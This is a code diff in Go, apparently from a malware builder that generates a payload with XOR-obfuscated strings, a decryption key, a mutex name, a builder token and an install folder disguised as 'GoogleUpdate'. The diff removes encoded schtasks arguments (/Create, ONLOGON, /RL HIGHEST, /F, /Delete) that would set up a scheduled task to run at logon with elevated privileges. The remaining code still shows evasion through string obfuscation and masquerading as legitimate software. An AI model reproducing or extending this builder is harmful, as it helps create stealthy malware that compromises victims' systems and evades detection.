@@ -21,15 +21,6 @@ type globalValues struct {
 	EncServiceExeName   string
 	EncWorkerExeName    string
 	EncSchtasksExe      string
-	EncSchtasksCreate   string
-	EncSchtasksTn       string
-	EncSchtasksTr       string
-	EncSchtasksSc       string
-	EncSchtasksOnLogon  string
-	EncSchtasksRl       string
-	EncSchtasksHighest  string
-	EncSchtasksF        string
-	EncSchtasksDelete   string
 	EncProgramDataEnv   string
 	EncWindowsUpdateDir string
 	EncAppDataEnv       string
@@ -220,15 +211,6 @@ func buildGlobals(cfg Config) (globalValues, error) {
 		EncServiceExeName: xorWithKey(svcExeName, key),
 		EncWorkerExeName:  xorWithKey(workerExeName, key),
 		EncSchtasksExe:    xorWithKey("schtasks", key),
-		EncSchtasksCreate: xorWithKey("/Create", key),
-		EncSchtasksTn:     xorWithKey("/TN", key),
-		EncSchtasksTr:     xorWithKey("/TR", key),
-		EncSchtasksSc:     xorWithKey("/SC", key),
-		EncSchtasksOnLogon: xorWithKey("ONLOGON", key),
-		EncSchtasksRl:     xorWithKey("/RL", key),
-		EncSchtasksHighest: xorWithKey("HIGHEST", key),
-		EncSchtasksF:      xorWithKey("/F", key),
-		EncSchtasksDelete: xorWithKey("/Delete", key),
 		EncProgramDataEnv: xorWithKey("ProgramData", key),
 		EncWindowsUpdateDir: xorWithKey("GoogleUpdate", key),
 		EncAppDataEnv:     xorWithKey("APPDATA", key),
@@ -456,15 +438,6 @@ var encWorkerExeName = []byte{%s}
 var encMutexName = []byte{%s}
 var encBuilderToken = []byte{%s}
 var encSchtasksExe = []byte{%s}
-var encSchtasksCreate = []byte{%s}
-var encSchtasksTn = []byte{%s}
-var encSchtasksTr = []byte{%s}
-var encSchtasksSc = []byte{%s}
-var encSchtasksOnLogon = []byte{%s}
-var encSchtasksRl = []byte{%s}
-var encSchtasksHighest = []byte{%s}
-var encSchtasksF = []byte{%s}
-var encSchtasksDelete = []byte{%s}
 var encProgramDataEnv = []byte{%s}
 var encWindowsUpdateDir = []byte{%s}
 var encAppDataEnv = []byte{%s}
@@ -613,15 +586,6 @@ var decryptionKey = []byte("%s")
 		g.EncMutexName,
 		g.EncBuilderToken,
 		g.EncSchtasksExe,
-		g.EncSchtasksCreate,
-		g.EncSchtasksTn,
-		g.EncSchtasksTr,
-		g.EncSchtasksSc,
-		g.EncSchtasksOnLogon,
-		g.EncSchtasksRl,
-		g.EncSchtasksHighest,
-		g.EncSchtasksF,
-		g.EncSchtasksDelete,
 		g.EncProgramDataEnv,
 		g.EncWindowsUpdateDir,
 		g.EncAppDataEnv,
